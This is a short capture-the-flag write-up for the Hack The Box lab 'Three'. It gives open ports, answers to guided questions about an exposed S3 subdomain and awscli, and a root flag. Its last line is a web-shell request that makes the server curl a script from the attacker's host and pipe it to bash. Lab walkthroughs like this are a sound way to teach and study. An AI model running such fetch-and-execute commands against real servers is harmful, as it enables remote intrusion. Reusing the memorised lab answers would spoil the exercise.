# Starting point

## Three

> Yazeed Ahmed | 18 November 2022

```````````````````````
ip =  10.129.18.141

```````````````````````

## ATTACK Vector

open ports

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))


####  TASKS

1. How many TCP ports are open? | 2 

2. What is the domain of the email address provided in the "Contact" section of the website?  | thetoppers.htb

3. In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames? |   /etc/hosts 

4. Which sub-domain is discovered during further enumeration?  | s3.thetoppers.htb

5. Which service is running on the discovered sub-domain? | amazon s3

6. Which command line utility can be used to interact with the service running on the discovered sub-domain?  | awscli

7. Which command is used to set up the AWS CLI installation? | aws configure

8. What is the command used by the above utility to list all of the S3 buckets?  | aws s3 ls 

9. This server is configured to run files written in what web scripting language? | php


### FLAG 

root flag:  a980d99281a28d638ac68b9bf9453c2b


NB: http://thetoppers.htb/shell.php?cmd=curl%2010.10.16.142:8000/shell.sh|bash